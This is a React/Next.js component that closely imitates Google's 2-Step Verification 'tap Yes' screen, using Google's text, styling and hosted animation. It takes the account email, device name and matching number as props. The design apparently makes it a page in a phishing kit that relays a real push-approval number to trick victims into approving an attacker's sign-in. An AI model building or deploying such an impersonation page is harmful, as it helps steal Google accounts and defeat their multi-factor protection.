"use client"

import React from "react"
import Image from "next/image"

interface TapYesScreenProps {
  email?: string
  deviceInfo?: string
  matchingNumber?: string
  onSubmit?: () => void
}

export function TapYesScreen({ 
  email = "user@example.com", 
  deviceInfo = "device",
  matchingNumber = "45",
  onSubmit
}: TapYesScreenProps) {
  
  const handleNext = () => {
    if (onSubmit) {
      onSubmit()
    }
  }

  return (
    <>
      <h2>2-Step Verification</h2>
      <h3 style={{ textAlign: 'center', paddingBottom: '11px', marginBottom: '0.5rem' }}>
        To help keep your account safe, Google wants to make sure it's really you trying to sign in
      </h3>
      
      <div className="google-account-selector" style={{ marginTop: '-1rem', marginBottom: '1rem' }}>
        <div className="google-account-chip">
          <div className="google-account-icon">
            <svg aria-hidden="true" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
            </svg>
          </div>
          <div className="google-account-email">{email}</div>
          <div className="google-account-dropdown">
            <svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
            </svg>
          </div>
        </div>
      </div>

      {/* Gmail animation */}
      <div style={{ 
        position: 'relative',
        width: '100%',
        display: 'flex',
        justifyContent: 'center',
        marginBottom: '1rem'
      }}>
        <Image 
          src="https://ssl.gstatic.com/accounts/marc/gmail_ios_authzen.gif" 
          alt="Gmail notification" 
          width={200} 
          height={120}
          style={{ width: '45%', height: 'auto' }}
        />
      </div>

      {/* Instruction section */}
      <div style={{ width: '100%', marginTop: '1rem' }}>
        <h2 style={{ 
          color: '#000', 
          fontSize: '1.2rem', 
          fontWeight: 500, 
          fontFamily: 'Google Sans,Noto Sans Myanmar UI,arial,sans-serif', 
          letterSpacing: '0.1px', 
          lineHeight: '1.5', 
          marginBottom: '8px' 
        }}>
          Check your {deviceInfo}
        </h2>
        
        <div style={{ marginBottom: '0.5rem' }}>
          <p style={{ color: '#5f6368', fontSize: '14px', lineHeight: '1.5', marginBottom: '4px' }}>
            Google sent a notification to your phone. Open the Gmail app and tap <strong>Yes</strong> on the prompt to verify it's you.
          </p>
          
          {/* Matching number display with Google-style circle */}
          <div style={{ 
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center',
            marginTop: '1.5rem', 
            marginBottom: '1.5rem'
          }}>
            <div style={{
              width: '80px',
              height: '80px',
              borderRadius: '50%',
              border: '2px solid #dadce0',
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              fontSize: '2rem',
              fontWeight: '500',
              color: '#202124',
              backgroundColor: '#f8f9fa',
              boxShadow: '0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15)',
              fontFamily: 'Google Sans,Noto Sans Myanmar UI,arial,sans-serif'
            }}>
              {matchingNumber}
            </div>
          </div>
        </div>

        {/* "Don't ask again" checkbox - Google style */}
        <div style={{ 
          display: 'flex', 
          alignItems: 'flex-start', 
          marginTop: '1.5rem', 
          marginBottom: '1rem',
          width: '100%'
        }}>
          <div style={{
            position: 'relative',
            display: 'inline-block',
            marginRight: '12px'
          }}>
            <input 
              type="checkbox" 
              id="dontAskAgain" 
              defaultChecked 
              style={{
                position: 'relative',
                width: '18px',
                height: '18px',
                accentColor: '#1a73e8',
                cursor: 'pointer',
                margin: '0'
              }}
            />
          </div>
          <label htmlFor="dontAskAgain" style={{ 
            fontSize: '14px', 
            color: '#5f6368', 
            cursor: 'pointer',
            userSelect: 'none',
            lineHeight: '1.4',
            flex: 1
          }}>
            Don't ask again on this device
          </label>
        </div>

        {/* Buttons */}
        <div className="google-card-bottom" style={{ marginTop: '0.5rem', width: '100%' }}>
          <a href="#" style={{ fontSize: '14px' }}>Resend it</a>
          <button type="button" onClick={handleNext}>Next</button>
        </div>
        
        <div style={{ width: '100%', marginTop: '0.5rem', textAlign: 'left' }}>
          <a href="#" style={{ 
            color: 'var(--blue)', 
            fontSize: '14px', 
            fontWeight: 600,
            textDecoration: 'none',
            padding: '8px'
          }}>Try another way</a>
        </div>
      </div>
    </>
  )
}

